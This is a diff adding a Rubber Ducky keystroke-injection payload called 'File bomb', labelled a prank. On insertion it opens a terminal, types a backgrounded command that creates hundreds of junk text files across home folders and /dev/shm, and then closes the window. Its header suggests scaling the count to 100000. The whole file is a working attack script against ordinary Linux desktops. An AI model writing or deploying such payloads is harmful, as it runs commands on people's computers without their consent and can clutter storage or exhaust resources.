@@ -1,0 +1,19 @@
+REM Title: File bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches a terminal, spawns 420 txt files in each home dir, home, and root. Change the 420 to 100000 or something if you want more files.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING nohup cd /Home/Pictures && touch {1..420}.txt 2>/dev/null & cd /Home/Documents && touch {1..420}.txt 2>/dev/null & cd /Home/Music && touch {1..420}.txt 2>/dev/null & cd /Home/Videos && touch {1..420}.txt 2>/dev/null & cd /Home/Desktop && touch {1..420}.txt 2>/dev/null & cd /dev/shm && touch {1..420}.txt 2>/dev/null & cd .. && touch {1..420}.txt 2>/dev/null & disown
+ENTER
+DELAY 500
+ALT F4
